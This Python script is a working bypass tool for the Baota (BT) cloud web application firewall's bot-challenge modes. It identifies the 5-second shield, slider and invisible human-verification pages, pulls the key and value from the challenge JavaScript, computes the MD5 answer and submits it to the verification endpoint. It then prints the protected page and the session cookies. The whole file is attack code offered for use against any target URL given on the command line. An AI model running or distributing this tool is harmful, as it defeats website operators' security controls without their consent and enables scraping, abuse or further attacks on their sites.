#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""宝塔云WAF 3模式绕过"""
import requests, re, hashlib, sys

URL = sys.argv[1] if len(sys.argv) > 1 else "目标"
BASE = URL.rstrip("/").rsplit("/", 1)[0]


def compute(value, offset=1):
    return hashlib.md5("".join(str(ord(c) + offset) for c in value).encode()).hexdigest()


s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"

r1 = s.get(URL, timeout=15, allow_redirects=False)
print(f"绕过前: HTTP {r1.status_code}")

# 403无正文 → 无感验证, 带cookie重试
if r1.status_code == 403 and len(r1.text) < 200:
    print("[检测到] 无感验证")
    print(f"Cookie: {'; '.join(f'{k}={v}' for k,v in s.cookies.items())}")
    r1 = s.get(URL, timeout=15)
    print(f"重试: HTTP {r1.status_code}")
    if len(r1.text) < 500 and s.cookies:
        print(f"验证成功\n页面: {r1.text}")
        sys.exit(0)

# ===== 模式识别 =====
has_renji   = 'renji_' in r1.text
has_huadong = 'huadong_' in r1.text
has_btwaf   = 'btwaf=' in r1.text
is_5s       = has_renji and 'bt-info' in r1.text and '人机识别' in r1.text

if has_btwaf:
    print("[检测到] 5s盾")
    ck = re.search(r'btwaf=(\d+)"', r1.text).group(1)
    s.get(f"{BASE}/?btwaf={ck}", timeout=15)
elif is_5s:
    print("[检测到] 5s盾")
elif has_huadong:
    print("[检测到] 滑动验证")
elif has_renji:
    print("[检测到] 人机验证（无感）")
else:
    print("无需绕过（可能存在误判，反正已经过了）")
    print(f"页面: {r1.text[:1500]}")
    sys.exit(0)

# 提取JS key/value → 计算 → 提交验证
mode = "renji" if has_renji else "huadong"
js = re.search(rf'src="(/{mode}_[^"]+\.js\?[^"]+)"', r1.text).group(1)
r2 = s.get(f"{BASE}{js}", timeout=15)
key = re.search(r'(?:bt_)?key\s*=\s*"([^"]+)"', r2.text).group(1)
value = re.search(r'(?:bt_)?value\s*=\s*"([^"]+)"', r2.text).group(1)

offset = 0 if mode == "renji" else 1
comp = compute(value, offset)
vtype = "96c4e20a0e951f471d32dae103e83881" if mode == "renji" else "ad82060c2e67cc7e2cc47552a4fc1242"
endpoint = "yanzheng_ip.php" if mode == "renji" else "yanzheng_huadong.php"
vurl = f"{BASE}/a20be899_96a6_40b2_88ba_32f1f75f1552_{endpoint}?type={vtype}&key={key}&value={comp}"
r3 = s.get(vurl, timeout=15)
print(f"key={key}\n验证: {r3.text.strip()}")

# 最终
r4 = None
try: r4 = s.get(URL, timeout=30)
except: pass

ok = r4 and "huadong" not in r4.text and "滑动验证" not in r4.text and "btwaf" not in r4.text
print(f"最终: HTTP {r4.status_code if r4 else 'timeout'} [{'成功' if ok else '失败'}]")
if ok:
    print(f"Cookie: {'; '.join(f'{k}={v}' for k,v in s.cookies.items())}")
    print(f"页面: {r4.text}")
